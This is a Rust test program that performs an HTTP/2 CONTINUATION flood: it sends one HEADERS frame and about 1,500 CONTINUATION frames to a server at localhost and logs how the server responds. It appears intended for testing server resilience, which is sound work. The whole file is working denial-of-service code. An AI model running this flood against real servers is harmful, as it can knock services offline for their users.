use riphttplib::{parse_target, prepare_pseudo_headers, FrameBuilderExt, Request};
use riphttplib::types::{Header, ClientTimeouts, FrameH2};
use riphttplib::h2::connection::H2Connection;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Starting HTTP/2 CONTINUATION flood test...");
    let url = "https://localhost:8843";

    let target = parse_target(url)?;
    let timeout = ClientTimeouts::disabled();
    let req = Request::new(url, "GET")?;
    let headers = prepare_pseudo_headers(&req, &target)?;
    let cont_header = vec![Header::new("x-test".into(), "continuation-data".into())];

    let mut connection = H2Connection::connect(&target, &timeout).await?;

    let stream_id = connection.create_stream().await?;

    let headers_frame = FrameH2::header(stream_id, &headers, false, false)?;
    let continuation_frame = FrameH2::continuation(stream_id, &cont_header, false)?;
    let final_continuation_frame = FrameH2::continuation(stream_id, &cont_header, true)?;

    // Build and send the frame batch
    headers_frame
        .chain(continuation_frame.repeat(1500))
        .chain(final_continuation_frame)
        .send(&mut connection).await?;

    // println!("Frames sent successfully!");

    // // Read and display server responses
    // println!("Reading server responses...");
    let mut response_count = 0;
    let start_time = std::time::Instant::now();

    // Try to read responses for up to 5 seconds
    while start_time.elapsed() < std::time::Duration::from_secs(5) && response_count < 10 {
        match tokio::time::timeout(
            std::time::Duration::from_millis(1000),
            connection.recv_stream_event(stream_id)
        ).await {
            Ok(Ok(event)) => {
                response_count += 1;
                println!("Response {}: {:?}", response_count, event);

                // Check for specific event types that indicate server state
                match event {
                    riphttplib::h2::connection::StreamEvent::Headers { headers, end_stream, is_trailer } => {
                        println!("  → HEADERS response (end_stream: {}, is_trailer: {})", end_stream, is_trailer);
                        for header in &headers {
                            println!("    {}: {:?}", header.name, header.value);
                        }
                        if end_stream {
                            println!("  → Stream ended with headers");
                            break;
                        }
                    }
                    riphttplib::h2::connection::StreamEvent::Data { payload, end_stream } => {
                        println!("  → DATA response (end_stream: {})", end_stream);
                        println!("    Data: {}", String::from_utf8_lossy(&payload));
                        if end_stream {
                            println!("  → Stream ended with data");
                            break;
                        }
                    }
                    riphttplib::h2::connection::StreamEvent::RstStream { error_code } => {
                        println!("  → RST_STREAM received! Error code: {:?}", error_code);
                        break;
                    }
                }
            }
            Ok(Err(e)) => {
                println!("Error reading stream event: {}", e);
                break;
            }
            Err(_) => {
                // Timeout - no more events available
                if response_count == 0 {
                    println!("No response received (timeout after 1s)");
                } else {
                    println!("No more events received (timeout)");
                }
                break;
            }
        }
    }

    // println!("Total responses received: {}", response_count);
    // println!("Connection status: open={}", connection.is_connection_open());
    // println!("CONTINUATION flood attack completed.");
    Ok(())
}